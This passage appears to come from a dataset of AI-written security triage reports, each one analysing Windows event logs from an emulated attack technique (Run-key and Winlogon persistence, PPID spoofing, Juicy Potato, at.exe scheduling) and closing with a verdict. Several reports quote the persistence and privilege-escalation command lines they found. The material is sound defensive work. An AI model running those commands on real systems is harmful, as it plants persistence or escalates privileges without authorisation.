   - The subsequent execution of `PowerShell`, `cmd.exe`, and `sc.exe` reinforce this suspicion, as they have been used together to manipulate service configurations.

3. **Microsoft Edge Update Activity**:
   - The entries show multiple `MicrosoftEdgeUpdate.exe` processes running with various command-line arguments. The appearance of Microsoft Edge Update processes in logs is not uncommon as it is part of routine application maintenance. The activity and user (NT AUTHORITY\SYSTEM) appear legitimate and do not indicate compromise under usual circumstances.

4. **Time Synchronization**:
   - Several events indicate system time changes which are benign when related to time synchronization. However, these changes should be closely monitored in case they are used to manipulate log timestamps for malicious purposes.

5. **Service Control Manager Logs**:
   - Logs indicate failures to start the `Fax` service as configured—likely due to the earlier mentioned modification. This event means the altered service did not start as intended, hinting at either failed malicious configuration attempts or misconfigured legitimate attempts.

Based on the observations, the logs contain activities that appear suspicious due to the misuse of Windows services and system administration utilities, such as the unauthorized reconfiguration of the `Fax` service. Despite the absence of overt malicious payload executions, the service configuration actions and potential misuse of utilities suggest further investigation is warranted to determine intent and the risk of compromise.

**Resolution**: SUSPICIOUS

**Recommendations**:
- Conduct a thorough investigation into the CMD and PowerShell activity by reviewing related user activity and other system changes.
- Check for any unauthorized changes in the service configurations or registry modifications.
- Review user `SERVER002\admin_test` privileges and actions to ensure they match their role.
- Monitor the system for any further attempts to modify system services without appropriate authorization."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"### Detailed Log Analysis

#### Windows PowerShell Log
1. **Suspicious Process Execution**:
   - The PowerShell script attempts to launch two executables: `werfault.exe` and `CreateRemoteThreadNative.exe`. `werfault.exe` is Windows Error Reporting, which legitimately runs during services crashes, but its unusual invocation here raises suspicion.
   - The use of `CreateRemoteThreadNative.exe` in combination with process injection practices (`-pid $process.Id -debug`) is highly suspicious. This technique is often used in malware to execute code within the context of another process.

#### Application Log
1. **Defender State**:
   - Windows Defender is active, which is good practice for general security status but doesn't provide specific insight into this log set's potentially malicious activity.

#### System Log
1. **Time Manipulation**:
   - The logs show changes in system time (`EventID: 1` from Kernel-General and Security-Auditing), which can indicate attempts to manipulate timestamps, a technique sometimes used to confuse log timelines or avoid detection.

#### Sysmon Log
1. **Process Execution Tracking**:
   - Several processes found in the log entries like `werfault.exe`, `conhost.exe`, and `whoami.exe` have legitimate uses but should be monitored based on the context they operate in.
   - The execution of `C:\Windows\System32\werfault.exe` and processes initiated from directories under `%TEMP%` is suspicious, especially when linked to the PowerShell execution pattern observed.

#### Security Log
1. **Privilege Escalation and Access**:
   - Logs containing `EventID: 4672` - Privileges assigned to `admin_test` user include `SeDebugPrivilege`, which can be abused for sophisticated attacks.
   - Multiple logon events (`EventID: 4624`) indicate NTLM authentication potentially from an external source (noted IP address logging), which needs further verification for authorized access.

### Assessment and Recommendations

- **Assessment:** The observed behavior in the PowerShell logs, combined with the execution of non-standard executable files such as `CreateRemoteThreadNative.exe`, strongly indicates potential malicious activity. The use of process injection is especially concerning. Additionally, time manipulation and privilege escalation events correlate with activities potentially indicative of compromise.
  
- **Resolution:** **MALICIOUS**
  
### Guidance on How to Proceed
1. **Immediate Isolation:** Isolate the affected host (Server002) to prevent further potential lateral movement by attackers.
2. **In-Depth Forensic Analysis:** Conduct deeper forensic analysis on `Server002` to verify all touched files, processes, and registry modifications.
3. **Review User Accounts:** Specifically assess activities related to the `admin_test` user for unauthorized access or changes.
4. **Malware Scanning:** Perform a comprehensive malware scan using updated definitions and advanced threat protection tools that may catch sophisticated obfuscation techniques.
5. **Patch and Update:** Ensure all systems are fully patched and security updates are applied, especially focusing on operational security tools.

Implementing these steps will help contain the threat, understand the extent of the breach, and prevent future occurrences."
Leverage Virtual Channels to execute custom DLL during successful RDP session,"Upon analysis of the provided log entries, here are the key findings:

1. **System and PowerShell Logs:**
   - The provided logs do not include Windows PowerShell logs. This omission could potentially be significant, especially if the execution of PowerShell scripts was a concern. Additionally, no specific malicious activities were noted in the system logs provided.

2. **Suspicious Registry Modification:**
   - A command executed via `cmd.exe` involves `reg add` to create a registry key under `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware`. This action raises a red flag, as it attempts to register a component labeled ""Malware,"" suggesting possible attempts to execute or establish persistence for unwanted software:
     ```
     ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\Malware"" /v Name /t REG_SZ /d ""C:\Windows\System32\amsi.dll"" /f
     ```
   - The use of ""Malware"" as part of a registry key or value name is unconventional and highly suspicious.

3. **Usage of Windows System Utilities:**
   - Execution of legitimate system utilities such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and `reg.exe` are noted. Although these utilities are legitimate, they can also be used for reconnaissance and to execute malicious activities in more sophisticated attacks.

4. **Sysmon Log Entries:**
   - There are multiple instances of `wevtutil.exe` (Windows Event Utility) being executed. This could suggest attempts to manipulate or query event logs, although no direct malicious intent is captured from these logs.
   - The presence of `MicrosoftEdgeUpdate.exe` processes reflecting normal update activities. However, the processes run from unexpected directories, such as `C:\Program Files (x86)\Microsoft\Temp\`, could suggest potential suspicious activity, though not necessarily malicious without further context.

5. **EdgeUpdate Activity:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` with various command-line arguments are noted. While these could reflect legitimate update processes, they could also be associated with unwanted behavior or be masquerading processes. The use of paths like `C:\Program Files (x86)\Microsoft\Temp\` is noteworthy but not definitively malicious.

**Summary and Recommendations:**

- **Resolution: SUSPICIOUS**
  - The registry modification under a suspicious key, coupled with activities suggestive of process manipulation, warrants further investigation.
  
**Guidance on How to Proceed:**

1. **Validation of Registry Changes:**
   - Investigate the suspicious registry key ""Malware"" under `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins` and ensure that no unauthorized components are leveraging this key.

2. **Examine Unusual Paths:**
   - Analyze the processes running from unexpected paths such as the `Microsoft\Temp` directory for validity and origin.

3. **Integrity and AV Check:**
   - Conduct comprehensive system scans using updated antivirus/malware detection tools to confirm any overlooked malicious activity.

4. **Additional Log Gathering:**
   - If possible, gather additional logs including PowerShell, network, and audit logs to gather context not apparent in the present log data.

5. **Monitoring and Alerts:**
   - Enhance monitoring for further instances or indicators of similar suspicious activities, ensuring that alerts are configured for actions involving sensitive registry changes and abnormal utility usage. 

Close attention should be paid to discerning any possible correlations between these activities and any other incident reports or anomalies within the broader system ecosystem."
HKLM - Policy Settings Explorer Run Key,"Upon analyzing the provided Windows event logs, there are several points of interest that warrant further discussion:

1. **Unusual Process Execution with PowerShell:**
   - There is a sequence of events in the logs indicating PowerShell activity with the following command:
     ```
     powershell.exe & {if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")) { New-Item -ItemType Key -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" } Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""filetest"" -Value ""C:\Windows\System32\calc.exe""}
     ```
   - This PowerShell command attempts to modify the registry to create a persistence mechanism by adding a registry key under 'Run', which will execute `calc.exe` upon login. This type of activity is typically associated with an attempt to maintain persistent access to the host and is a common technique used by malware or malicious actors.

2. **Command-Line Arguments:**
   - The same PowerShell command manipulates registry keys related to startup processes. Any modification to these registry keys should be tightly controlled and monitored, as it could be a sign of an attack trying to auto-execute arbitrary code beyond system reboots.

3. **High Privilege Actions:**
   - Events indicate that the user `SERVER002\admin_test` executed commands with high integrity level permissions. Monitoring for high privilege command executions is crucial especially when registry modifications are involved.

4. **Suspicious Timing:**
   - The events exhibit rapid execution of several processes `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, which may simulate reconnaissance activities often preceding a compromised attack vector initiative.

Based on this analysis, although there are no logs explicitly showing the execution of a known malicious payload, the alteration of registry settings using PowerShell to establish persistence is worrisome. This activity aligns with tactics, techniques, and procedures (TTPs) commonly used by adversaries to leverage PowerShell for persistence and potentially further malicious purposes.

**Resolution: SUSPICIOUS**

- **Guidance on How to Proceed:**
  - **Immediate Action:**
    - Investigate and validate with the user or system administrator if this PowerShell script was intentionally executed for a legitimate purpose.
    - Analyze the system further for any more signs of compromise, including checking for unauthorized access, additional persistence methods, and reviewing system/application security logs for anomalies.
    - Consider quarantining the affected system from the network if unauthorized suspicion persists.
  - **Preventive Measures:**
    - Implement tighter controls and monitoring on PowerShell execution.
    - Restrict unauthorized users from modifying critical system registry keys.
    - Enhance logging and alerting mechanisms to detect similar activities promptly in the future."
Snake Malware Kernel Driver Comadmin,"Upon reviewing the provided logs, several elements stand out that may warrant further investigation:

1. **PowerShell Activity**: The PowerShell logs indicate the execution of a script that generates random bytes and writes them to a file `comadmin.dat` in a newly created directory `system32\Com`. This behavior can be indicative of a benign script, but it is also a common tactic used by threat actors to establish persistence by storing malicious payloads disguised as legitimate files. The absence of direct command names, scripts, or command lines other than the in-line script could imply obfuscation or attempts to evade detection.

2. **Sysmon Events**: Numerous Sysmon events show execution of common Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. Each of these processes is being executed by the user `SERVER002\admin_test` with high integrity level, which might suggest privilege escalation. The observed sequence of launching utilities, particularly `whoami.exe`, often appears in post-exploitation scenarios to gather system information.

3. **Microsoft Edge Update Activity**: The frequent execution of Microsoft Edge update processes, including `MicrosoftEdgeUpdate.exe` and related executables, seems consistent with normal update operations. However, the use of temporary directories and multiple instances running within a short timeframe could indicate misuse or an attempt to utilize legitimate processes for malicious purposes if these processes were not legitimately scheduled during the provided timestamps.

**Assessment**: 
- The PowerShell activity is concerning due to the potential for abuse, as it resembles tactics used for persistence or data manipulation.
- The use of high-integrity system utilities and certain command-line tools by user `admin_test` in a rapid sequence can be indicative of post-compromise activity.
- Edge update operations appear frequent but could be benign if aligned with known update schedules.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate the intention and legitimacy of the PowerShell script in use, especially the file creation in system directories.
- Assess the user `admin_test` activity and context for any known authorized administrative tasks during these events.
- Verify if the Edge update processes are consistent with typical behavior for scheduled updates or if they may be leveraged as part of a malicious campaign.
- Monitor for any additional unusual activities or changes on Server002, and consider deploying additional endpoint detection and response (EDR) tools to enhance visibility."
Parent PID Spoofing - Spawn from Current Process,"Upon reviewing the provided Windows event logs, I have conducted a detailed analysis and identified the following points of interest:

### Windows PowerShell Log:
1. The logs show the execution of PowerShell with the command `Start-ATHProcessUnderSpecificParent`, which appears to be running a command to sleep for 10 seconds: `'-Command Start-Sleep 10'`. 
    - **Observation**: The use of PowerShell with such a script can be indicative of process masquerading or an attempt to evade detection. However, `Start-ATHProcessUnderSpecificParent` does not appear to be a standard PowerShell command, suggesting this might be a custom script or module in use.

### System Log:
1. The system log contains regular entries related to Windows Updates and configuration changes without anything standing out as explicitly suspicious.
2. The updates relate to legitimate Microsoft applications such as Windows Camera, Your Phone, and Microsoft VCLibs.

### Sysmon Log:
1. Several executions of system binaries such as `wevtutil.exe`, `conhost.exe`, `wsmprovhost.exe`, and `CompatTelRunner.exe` are logged.
2. The presence of `CompatTelRunner.exe` is part of the Windows Compatibility Telemetry, which is a legitimate process for Windows diagnostics.
3. The `wevtutil.exe` utility is used for managing event logs, and its frequent execution by the `admin_test` user might warrant a closer look, as it could be used for clearing logs to hide tracks.

### Security Log:
1. The logs document credential retrieval operations which returned a code `3221226021`, typically indicating a failed operation. 
2. Logon events and privilege assignments appear routine, with no unexpected user accounts or privilege elevations.

### Application Log:
1. Contains entries related to the Software Protection Platform Service, which are typical on Windows systems and confirm the operation of licensing components.

### Final Analysis:
- **Suspicious Activity**: The script `Start-ATHProcessUnderSpecificParent` and the repeated use of command utilities like `wevtutil.exe` and the presence of PowerShell activity without explicit benign explanation give rise to suspicion. 
- **No Clear Malicious Indicators**: Although the activity is suspicious, there is no direct malicious indicator from the analyzed logs such as a known malware signature or command.

### Resolution:
- **Resolution**: SUSPICIOUS
- **Recommendation**: I recommend conducting a more detailed investigation into the origin and purpose of the `Start-ATHProcessUnderSpecificParent` script or module. Additionally, ensure that log access patterns align with expected administrative activities. Observing system behavior, tracking network connections, and scanning for known IOCs (Indicators of Compromise) could assist in verifying the environment’s integrity."
Access Token Manipulation,"Upon reviewing the provided Windows event logs, I have identified several entries and activities that stand out:

1. **PowerShell Execution:**
   - The execution of PowerShell with the script `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\GetToken.ps1""` and the command to create a process from a parent process, specifically using `lsass` to launch `cmd.exe`, is particularly suspicious. This behavior suggests an attempt to obtain credentials from the Local Security Authority Subsystem Service (LSASS), a common technique used in credential dumping attacks.

2. **Set-ExecutionPolicy Bypass:**
   - The PowerShell command includes `Set-ExecutionPolicy -Scope Process Bypass -Force`, which is often used to run scripts without restriction, potentially facilitating the execution of malicious code.

3. **Process Creation and Execution:**
   - Various system utilities such as `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` are executed. While not inherently malicious, the context in which `whoami.exe` and `HOSTNAME.EXE` are used might suggest reconnaissance activity.

4. **Edge Update Processes:**
   - There is extensive activity involving Microsoft EdgeUpdate processes. While regular update checks and installations are part of normal operations, the activity recurrence and timing should be corroborated with known update schedules to rule out misuse.

5. **General System Behavior:**
   - Numerous benign system services such as `svchost.exe` and `sppsvc.exe` performed expected operations like time adjustments and service management.

### Assessment:
Given the detailed analysis, there is a critical indicator of potential malicious activity linked to PowerShell execution aimed at credential dumping (`GetToken.ps1`). This behavior is concerning and typically associated with post-exploitation phases of an attack where attackers seek to escalate privileges or move laterally within the network.

### Resolution:
**MALICIOUS** - There is sufficient evidence from the PowerShell logs indicating attempts to execute possibly malicious scripts for credential access. Immediate actions should be taken to investigate the affected system further, contain any potential breach, and secure the environment.

### Guidance to Proceed:
1. **Isolate the Affected Host:**
   - Detach the system from the network to prevent further potential lateral movements or data exfiltration.
   
2. **Conduct a Full Host Investigation:**
   - Analyze memory dumps, file systems, and other logs for additional indicators of compromise. Look into any modified scripts or unauthorized access attempts.
   
3. **Review Credential Access:**
   - Ensure all sensitive accounts are monitored for unusual activity and consider resetting passwords for potentially compromised accounts.

4. **Update and Patch:**
   - Ensure all systems and software are updated to the latest versions with security patches applied.

5. **Strengthen Security Posture:**
   - Implement and enforce strict PowerShell execution policies and monitor scripts rigorously.
   
6. **Engage Incident Response Team:**
   - If available, engage the organization's incident response team or a relevant cybersecurity response service for further investigation and remediation. 

Following these steps should help mitigate the immediate threat and ensure a thorough investigation is conducted to understand and prevent future incidents."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"Upon reviewing the provided logs, several observations and conclusions can be drawn:

### Detailed Analysis:

#### Windows PowerShell Logs:

1. **PowerShell Script Execution**: 
   - The command executed through PowerShell is modifying registry keys to backup and change the `Shell` value in the Windows Registry under `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. This is a common technique used by malware to persist on a system by executing a malicious shell during user logon.
   - The script attempts to append `C:\Windows\explorer.exe` to an existing `Shell` value. Any modification to the `Winlogon\Shell` key is suspicious because it can dictate what user interface or program is initiated on login.

#### Sysmon Logs:

2. **Frequent Execution of System Utilities**:
   - Utilities like `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` were executed multiple times by a user account `SERVER002\admin_test`. Regular usage by an admin could justify this, but their proximity to other suspicious activities warrants concern.
   - `whoami.exe` is executed, which might be an indication of an attacker trying to identify the current user's privileges.

3. **PowerShell Execution**:
   - The appearance of `powershell.exe` with a command line similar to the script seen in the PowerShell logs further corroborates the suspicion. It suggests potential scripted or automated execution that may be part of advanced persistent threat (APT) activity or automated breach tools.

#### Security Logs:

4. **Privilege Escalation**:
   - Event ID `4672` shows that the user `admin_test` was granted high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). This is normal for admin users but should be closely monitored if unexpected.

5. **Focus on Specific User**:
   - Multiple events are tied to the activity of `admin_test`. While some actions could be legitimate admin tasks, they may indicate an insider threat or compromised credentials if not properly verified.

#### Application and System Logs:

6. **Time Change Events**:
   - Several kernel general and time service logs indicate changes to system time. Time changes can be a tactic to evade time-based security settings or forensic timelines.

7. **Common System and Network Processes**:
   - Execution of Microsoft Edge updates and other network service processes appears normal and related to system maintenance activities.

### Assessment:

The evidence points to the likelihood of a compromised system or user account (`SERVER002\admin_test`). The combination of registry modifications via PowerShell, systematic exploration of user privileges, and time adjustments suggest potentially coordinated and sophisticated malicious activity.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Action**:
   - Isolate the affected host from the network to prevent any lateral movement or data exfiltration.
   - Change credentials for `admin_test` and any other user accounts that may have been compromised.

2. **Forensic Investigation**:
   - Conduct a full disk forensic analysis to track any file system changes and identify malicious payloads.
   - Review network logs to identify any unusual outbound connections or data transfers.

3. **Remediation**:
   - Restore any modified registry keys to their previous safe state.
   - Monitor the system for any recurring abnormal activities, potentially using enhanced logging and alerting.

4. **Strengthen Security Posture**:
   - Implement stricter access controls and privilege restrictions based on the principle of least privilege.
   - Consider deploying endpoint detection and response (EDR) solutions to enhance visibility into process and script activities.

By following these guidelines, the potential threat can be mitigated, and the security integrity of the system restored."
Parent PID Spoofing using PowerShell,"Based on the analysis of the provided Windows event logs, there is evidence of suspicious activity that needs further investigation. Here are the key points of concern:

1. **PowerShell Script Execution**: There are multiple instances of PowerShell being executed with potentially malicious intentions. The script path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\PPID-Spoof.ps1`) indicates the use of a technique known as Parent Process ID (PPID) spoofing, which can be used by attackers to mask the origin of a malicious process by assigning it a different, often legitimate-looking parent process. This is further indicated by the command-line usage which includes potentially suspicious actions and paths, such as the use of `iexplore.exe` and a `dllpath`.

2. **Use of Wevtutil and Conhost**: A pattern of `wevtutil.exe` and `conhost.exe` processes executed by `admin_test` user is evident. `wevtutil.exe` is a legitimate Windows utility often used for managing Windows event logs, but its use in conjunction with `conhost.exe` without a clear legitimate reason could be suspicious, especially if tied to unauthorized access or information gathering.

3. **Use of Elevated Privileges**: Event 4672 in the Security logs indicates that the account used (`SYSTEM`) was assigned special privileges such as `SeDebugPrivilege`, which can be used for debugging and potentially manipulating processes; this can be used for malicious purposes like DLL injection.

4. **Credential Validation Attempts**: There are multiple 5379 events indicating attempts to read credentials related to Microsoft accounts or Windows Live tokens, which resulted in failure. This could be an indication of attempted credential theft or scraping attempts.

5. **Process Activities by `admin_test`**: The `admin_test` account was involved in several process execution activities, such as running `wevtutil.exe`, `conhost.exe`, `powershell.exe`, among others. The combination of these processes and the contexts they're executed in (often tied to potential malicious operations) seem anomalous without clear documentation of legitimate use.

Given these observations, the logs contain activities that are **SUSPICIOUS** and warrant further investigation. It is crucial to:

- Perform a thorough investigation of the user activity associated with `admin_test` during the time of these events.
- Analyze the PowerShell script found in the path to determine its intentions.
- Review network logs for any unauthorized data exfiltration that might have occurred around the time of these log events.
- Investigate the legitimacy of the processes that were executed and determine if there are any unauthorized modifications or installations on the system.
- Ensure that sensitive systems have adequate security measures in place to prevent and detect such activities in the future.

Further investigation and corroboration are necessary to definitively categorize the activity as malicious. However, immediate attention is recommended to contain any potential security threat and to protect sensitive data."
At.exe Scheduled task,"Based on the analysis of the provided logs, we draw the following observations: 

**Security Logs:**
- We observe Event ID 4616 indicating time change events by `C:\Windows\System32\svchost.exe`. These are benign under normal operation assuming they correlate with legitimate time synchronization.

**Application Logs:**
- A single entry related to the Software Protection Platform Service does not indicate any malicious activity.

**Sysmon Logs:**
- Multiple occurrences of process executions are logged. Specific attention is given to:
  - Execution of `C:\Windows\System32\wevtutil.exe`, `C:\Windows\System32\conhost.exe`, and `C:\Windows\System32\cmd.exe`.
  - Notably, `cmd.exe` is executed with the command line `\""cmd.exe\"" /c at 13:20 /interactive cmd`, which schedules a command to open an interactive command prompt. This is a technique often used for privilege escalation.
  - `at.exe` usage to schedule tasks could indicate unwanted or suspicious activity, as it's not commonly used for legitimate purposes in the context provided.
  - Execution of `whoami.exe` and `hostname.exe`, while typically benign, can be part of a reconnaissance effort.

**System Logs:**
- Consist mainly of time synchronization logs, which matches the security logs and is benign.

Considering all the above points, the suspicious behavior mainly pertains to the use of the task scheduler through the command prompt and `at.exe` which could point to potential privilege escalation or persistent backdoor creation. 

---

In conclusion, due to the suspicious use of `cmd.exe` and `at.exe`, specifically with the interactive switch which suggests potential unauthorized privileges or persistent access attempts, we recommend further investigation into:
- The purpose and context of scheduled tasks.
- The origin of the `cmd.exe` command observed.
- Verifying user account activities and any potential unauthorized logins around this time.

**Resolution: SUSPICIOUS**"
Domain Password Policy Check: No Lowercase Character in Password,"### Analysis of Event Logs

After reviewing the Windows event logs provided, let's break down key activities that are noteworthy and could potentially indicate malicious or unusual activity.

1. **Microsoft Edge Installation and Updates**:
   - Multiple logs indicate the process ""setup.exe"" associated with the Microsoft Edge Installer. It involves update or maintenance tasks executed system-wide under the NT AUTHORITY\SYSTEM account, which is typical for such processes.
   - The command lines used in these logs correspond to normal update and setup operations for Microsoft Edge.
   - The SHA256 hash is consistent across multiple logs, indicating the same executable involved in the update process.

2. **PowerShell Activity**:
   - A sequence of logs shows PowerShell activities executed by a user ""SERVER002\admin_test"".
   - The command attempts to change the password using PowerShell scripts and credentials stored in a file, which is unconventional and particularly concerning.
   - The script involves reading a credential file, verifying old passwords, and setting new passwords with specific strings (""UPPER-LONG-SPECIAL-333""). This could indicate someone either trying to replace the credential management process or a misconfigured script being executed.
   - The script handles errors tied to incorrect passwords and suggests removing the credential file if errors occur, which could be used for cleaning up traces.

3. **Other Processes**:
   - The execution of other utility programs like ""wevtutil.exe"" and ""Hostname.exe"" are common administrative tasks; however, the frequent use tied with the admin account ""SERVER002\admin_test"" in a short period draws some attention, but alone they do not inherently appear malicious.

4. **Security and Application Logs**:
   - The security and application logs are empty, which can be typical if no successful or failed logon attempts occurred, or no exceptional application events are recorded. However, an absence of logs, especially in a busy environment might suggest tampering.

### Assessment
- **Suspicious Behaviour**: The activity surrounding PowerShell and possible credential manipulation is not standard practice even if administrative tasks are performed. This raises a suspicion level that warrants further investigation.
- **Potential Threats**: Misuse of PowerShell for credential operations could suggest either mismanagement of scripts or potential malicious operations attempting unauthorized access or credential stuffing.

### Resolution
- **Resolution**: SUSPICIOUS

### Recommendations
- **Immediate Investigation**: Investigate the origin and context of the PowerShell script execution. Verify if this is part of a legitimate administrative task or unauthorized changes.
- **Review Policies**: Ensure that credential management is consistently handled by approved and secure methods.
- **Audit Security Configurations**: Review user permissions and logging configurations to ensure they’re adequate for monitoring and capturing such activities.
- **Enhance Security Monitoring**: Increase the monitoring on PowerShell executions, especially those involving credential changes to detect and prevent unauthorized access.

### Conclusion
These logs should be treated as suspicious due to potential misuse of PowerShell tied with credentials, which is a critical function. This activity may either highlight gaps in process or indicate unauthorized operations needing swift investigation."
Juicy Potato,"**Analysis of Logs:**

Upon review of the provided logs, several key points and observations emerge related to potential suspicious or malicious activities:

1. **PowerShell and Command Execution:**
   - There is a PowerShell execution event logged, specifically invoking a suspicious command: `""powershell.exe"" & {cmd /c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe' -l '7777' -t * -p '$env:windir\\system32\\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}`.
   - This command runs a script from a temporary directory, which is often indicative of transient or unauthorized code execution. Additionally, executing an external script from such directories can often signify malicious intent, particularly given the use of command-line arguments and potential obfuscation (e.g., use of `cmd /c`).

2. **Wevtutil and Other Utility Usage:**
   - The frequent invocation of `wevtutil.exe` by the user `SERVER002\\admin_test` may suggest event log management or tampering. The usage pattern of this tool, especially if repeated without clear necessity, can be suspicious as attackers might use it to clear or dump event logs to cover their tracks.

3. **Overview of Microsoft Edge Update Process:**
   - Multiple entries show activities surrounding `MicrosoftEdgeUpdate.exe`. These actions correspond with its normal function updating Edge, suggesting this activity itself may not inherently be suspicious.

4. **High Integrity Level Processes:**
   - The processes, including PowerShell executions, were running with `High` integrity level, often requiring escalated privileges, thus increasing potential risk if misused.

5. **Indicator of Abuse:**
   - The execution of common administrative tools like `HOSTNAME.EXE`, `whoami.exe`, or invoking scripts with PowerShell from temporary locations are common behaviors within both benign administrative activities and malicious scenarios. However, without more context or repeated usage patterns, it might be questionable but not definitively malicious.

6. **General Windows System Utilities:**
   - Frequent running of `svchost.exe`, `conhost.exe`, and other system-related hosted processes appear normal without additional context of purpose or behavior indicative of compromise.

**Assessment:**

- Based on the logs, the invocation of an external script using PowerShell, especially from a temporary directory, coupled with potential event log manipulation tools (`wevtutil.exe`), suggests a risk of suspicious behavior. While normal system updates and interactions are evident, specific entries, particularly around PowerShell usage and event log utility, raise red flags that warrant deeper investigation to rule out malicious intent.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Investigation:**
   - Investigate the PowerShell execution and the specific external script referenced in its command-line arguments. Validate if this execution was authorized or necessary for legitimate administrative purposes.

2. **Log Integrity Check:**
   - Review and ensure integrity of event logs to detect any evidence of tampering, especially related to `wevtutil.exe` usage.

3. **System and File Examination:**
   - Conduct thorough checks on the system files around the times of peculiar execution logged, especially from temporary directories, ensuring no unauthorized files or processes.

4. **User Account and Activity Review:**
   - Audit activities initiated by `SERVER002\\admin_test` and determine if these align with expected roles and permissions.

5. **Threat Hunting and Network Monitoring:**
   - Implement threat hunting strategies focusing on behavioral analysis during the timeframe of the events. Additionally, heighten monitoring of system network activities for unusual patterns.

By following these steps, you could either confirm malicious activities or clear these events as non-threatening, potentially adjusting monitoring practices or user access controls accordingly."
Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Based on the analysis of the provided logs, let's break down the key observations that indicate potential anomalies or suspicious activities:

### Key Observations:

1. **PowerShell Activity:**
   - There is a PowerShell command execution that involves copying the `calc.exe` (calculator application) to a temporary directory and then changing a registry value related to the ""Common Startup"" folder path.
   - The command also indicates setting `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders` ""Common Startup"" to this temporary location, which could be used to maintain persistence by making `calc.exe` execute on startup.
   - Such behavior is considered a potential indicator of compromise as PowerShell is often leveraged in malicious activities to automate attacks or maintain persistence.

2. **System and Security Events:**
   - The system and security logs do not show explicit signs of compromise by themselves. They show typical logging activities involving time changes and kernel events. 
   - The time changes recorded are typical of system synchronization or configuration updates, without clear malicious indicators.

3. **Sysmon Logs:**
   - Extensive activities related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are observed, but these are legitimate system update actions.
   - However, without any set rules being violated or suspicious file hashes or unknown executables present in the logs given, these activities, on their own, do not constitute a clear indicator of compromise.

4. **Application Logs:**
   - The logs show system-level logs related to processes like `edgeupdate` service starting or stopping. These are legitimate and expected behaviors in an environment running Microsoft Edge.

### Assessment:

Based on the logs:
- The **PowerShell activity is highly suspicious** given the operations being performed, such as manipulating the startup item registry to include an executable from a temporary directory. 
- The extensive Edge Update activities might need further scrutiny to ensure no masking of malicious process executions is present, but they appear to belong to legitimate update actions.

### Conclusion:

**Resolution: SUSPICIOUS**

The PowerShell script indicates potentially malicious behavior looking to exploit persistence mechanisms on the host. This requires further investigation, particularly to confirm whether the ""calc.exe"" is a benign copy or has been replaced with a malicious version. The legitimate application updates do not raise an immediate red flag but should still be confirmed against expected activities during this time frame.

### Recommended Action:

- Isolate the affected system immediately to prevent lateral movement within the network.
- Investigate the content and hash of the `calc.exe` file within the specified directory.
- Review communication logs and active network connections of the host during and post-command execution.
- Conduct a thorough scan for unauthorized scripts or scheduled tasks leveraging PowerShell or other scripting utilities.
- Verify recent changes in the registry and revert unexpected modifications after confirming their benign nature.  
- Evaluate Edge Update activities to ensure they are recognized updates and align with known update schedules and content.
"
Suspicious vbs file run from startup Folder,"**Analysis of Logs**

After reviewing the provided logs, there are several points that stand out indicating potentially suspicious or malicious activities:

### Windows PowerShell Log Analysis

1. **Suspicious Script Activity**:
   - Multiple instances of PowerShell sessions initiating the `Copy-Item` commands for the file `vbsstartup.vbs` to be placed in the startup directories (`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs` and `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs`).
   - The execution of `cscript.exe` with the copied VBS files in startup directories, suggesting attempts at persistence.
   - This behavior is generally associated with attempts to establish persistence on the system through startup scripts.

### Sysmon Log Analysis

1. **Repetitive Process Execution**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` without any apparent legitimate reason. This tool is often used for querying or clearing event logs, which might suggest log manipulation to cover tracks.
   - Execution of the `whoami.exe` process, which can be part of reconnaissance activities to confirm the user context.

2. **PowerShell and CScript Execution**:
   - The `powershell.exe` execution linked with the creation and subsequent running of the `vbsstartup.vbs` file aligns with the suspicious PowerShell activity noted above.
   - Further, the `cscript.exe` executions with explicit reference to running `vbsstartup.vbs` files indicate that these scripts are being invoked to achieve their malintent functionality when the system starts.

### Security Log Analysis

- **Time Discrepancies**:
   - There are events suggesting the system time was tampered with or adjusted by the service `svchost.exe`. This aligns with covering tracks or manipulating logs potentially indicating attempts to confuse log timelines.

### System Log Analysis

- **Time Changes**:
   - As seen in the security logs, events where system time was altered coincide with suspicious activities and do not match with routine administrative tasks.

### Conclusion

Given the analysis of the logs, there are distinct indicators of an attempt to establish persistence using unauthorized scripts and possible log manipulation activities to cover tracks. The combination of file copying to startup folders, script execution, and time alterations points towards a potential compromise.

**Resolution**: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Action**: 
   - Isolate Server002 from the network to prevent any further spread of potential threats.
   
2. **Incident Response**:
   - Conduct a deeper forensic investigation on the server to identify additional indicators of compromise.
